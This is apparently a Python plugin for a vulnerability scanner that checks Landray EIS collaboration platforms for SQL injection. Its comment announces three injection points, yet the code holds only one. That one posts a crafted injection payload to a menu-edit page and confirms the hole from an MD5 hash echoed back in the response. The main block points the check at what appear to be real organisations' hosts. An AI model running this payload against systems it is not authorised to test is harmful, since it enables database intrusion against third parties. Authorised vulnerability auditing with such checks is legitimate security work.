#!/usr/bin/env python
# -*- coding: utf-8 -*
# 蓝凌EIS智慧协同平台3处SQL注入
import re

def assign(service, arg):
    if service == 'landray':
        return True, arg
        
def audit(arg):

    url=arg+'sm/menu_left_edit.aspx'
    post="action=dragdrop&id=1&parent_id=1%20where%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123%27)))--"
    code,_,res,_,_ = curl.curl2(url,post)
    if code!=0 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('landray','http://oa.hejiangroup.com/')[1])
    # audit(assign('landray','http://oa.geheng.com:800/')[1])